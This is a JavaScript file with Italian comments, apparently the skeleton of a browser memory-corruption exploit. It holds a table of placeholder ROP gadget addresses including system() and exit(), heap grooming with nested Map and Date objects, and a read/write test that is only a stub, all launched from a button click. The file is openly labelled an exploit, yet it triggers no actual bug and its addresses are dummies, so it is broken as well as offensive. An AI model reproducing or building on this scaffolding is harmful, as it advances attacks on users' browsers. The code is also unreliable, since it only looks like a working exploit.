const gadgets = {
    "pop_rdi": 0x0000000000401234,  // Indirizzo gadget pop rdi
    "pop_rsi": 0x0000000000405678,  // Indirizzo gadget pop rsi
    "pop_rdx": 0x0000000000409abc,  // Indirizzo gadget pop rdx
    "ret": 0x000000000040abcd,      // Indirizzo ret
    "system": 0x0000000000401111,   // Indirizzo della funzione system()
    "exit": 0x0000000000402222      // Indirizzo della funzione exit()
};

// Funzione di Garbage Collection ridotta per evitare crash
function gc() {
    try {
        new Uint8Array(256 * 1024);  // Limita l'allocazione per evitare sovraccarico
        alert('GC eseguita');
    } catch (e) {
        alert("Error in gc: " + e.message);
    }
}

// Funzione per creare la struttura degli oggetti (ridotta)
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];
    for (let i = 0; i < 5; i++) {  // Ridurre il numero di oggetti Date
        foo.push(new Date(0xffff));
    }
    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }
    gc();  // Esegui GC per liberare memoria
    alert('Object structure created');
    return root;
}

// Funzione di test RW
function rwTest(address, value) {
    alert(`Test RW: Scrivo ${value} in ${address}`);
    // Simulazione di test RW
    // Qui implementiamo una logica di test RW per manipolare i dati
    // (ad esempio una scrittura in memoria)
    // Il codice per testare RW potrebbe dipendere dalla situazione specifica
    // della piattaforma su cui si sta eseguendo l'exploit
}

// La funzione principale che gestisce l'exploit
async function main() {
    alert('Inizio exploit');
    const num_elems = 1600;
    let root = createObjectStructure(num_elems);

    alert('Object structure creata, continuando con l\'exploit');
    
    // Aggiungi un'ulteriore operazione per vedere che tutto continua
    rwTest(0xdeadbeef, 0x12345678);  // Esegui un test RW (scrittura in memoria)
    
    alert('Test RW completato');
}

// Chiamata iniziale per avviare l'exploit
document.getElementById('button').addEventListener('click', async () => {
    await main();
});
